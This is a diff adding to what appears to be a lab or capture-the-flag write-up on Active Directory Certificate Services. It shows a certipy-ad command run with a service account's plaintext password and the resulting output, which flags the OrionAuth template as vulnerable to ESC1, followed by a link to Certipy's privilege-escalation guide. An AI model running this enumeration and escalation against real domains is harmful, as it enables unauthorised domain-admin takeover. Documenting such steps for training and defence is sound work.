@@ -606,5 +606,84 @@ Maybe something to do with ADCS
 # ADCS leads to domain admin
 
 ```python
+❯❯❯ certipy-ad find -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' -dc-host dc01.orion.local -dc-ip 10.0.0.5 -target-ip 10.0.0.5 -target dc01.orion.local -stdout -enabled -vulnerable
 
+Certificate Authorities
+  0
+    CA Name                             : orion-DC01-CA
+    DNS Name                            : DC01.orion.local
+    Certificate Subject                 : CN=orion-DC01-CA, DC=orion, DC=local
+    Certificate Serial Number           : 10CEC7AA2F7D31AD4064CBA0BF227013
+    Certificate Validity Start          : 2026-10-03 16:25:15+00:00
+    Certificate Validity End            : 2031-10-03 16:35:14+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : ORION.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : ORION.LOCAL\Administrators
+                                          ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+        ManageCertificates              : ORION.LOCAL\Administrators
+                                          ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+        Enroll                          : ORION.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : OrionAuth
+    Display Name                        : OrionAuth
+    Certificate Authorities             : orion-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 5 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-10-06T15:42:14+00:00
+    Template Last Modified              : 2026-10-06T15:43:10+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ORION.LOCAL\svc-pki
+                                          ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : ORION.LOCAL\Administrator
+        Full Control Principals         : ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+        Write Owner Principals          : ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+        Write Property Enroll           : ORION.LOCAL\Domain Admins
+                                          ORION.LOCAL\Enterprise Admins
+    [+] User Enrollable Principals      : ORION.LOCAL\svc-pki
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
+
+Looks like it might be vulnerable to ESC1
+
+## ESC1
+
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication
+
